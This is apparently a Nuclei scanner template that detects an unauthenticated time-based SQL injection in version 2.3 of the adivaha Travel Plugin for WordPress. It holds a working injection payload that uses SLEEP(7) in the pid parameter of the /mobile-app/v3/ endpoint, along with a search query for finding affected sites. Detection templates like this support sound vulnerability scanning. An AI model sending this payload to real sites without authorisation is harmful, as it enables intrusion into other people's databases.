http:
- matchers:
  - condition: and
    dsl:
    - duration>=7
    - status_code == 200
    - contains(body, "adivaha")
    type: dsl
  raw:
  - '@timeout: 25s

    GET /mobile-app/v3/?pid=''+AND+(SELECT+6398+FROM+(SELECT(SLEEP(7)))zoQK)+AND+''Zbtn''=''Zbtn&isMobile=chatbot
    HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-adivaha-sqli
info:
  author: theamanrawat
  description: 'An unauthenticated Time-Based SQL injection found in adivaha Travel
    Plugin 2.3 allows a remote attacker to retrieve the contents of an entire database.

    '
  metadata:
    max-request: 1
    publicwww-query: /wp-content/plugins/adiaha-hotel/
    verified: true
  name: WordPress adivaha Travel Plugin 2.3 - SQL Injection
  reference:
  - https://wordpress.org/plugins/adiaha-hotel/
  severity: high
  tags: time-based-sqli,sqli,adivaha,wordpress,wp,wp-plugin,vuln
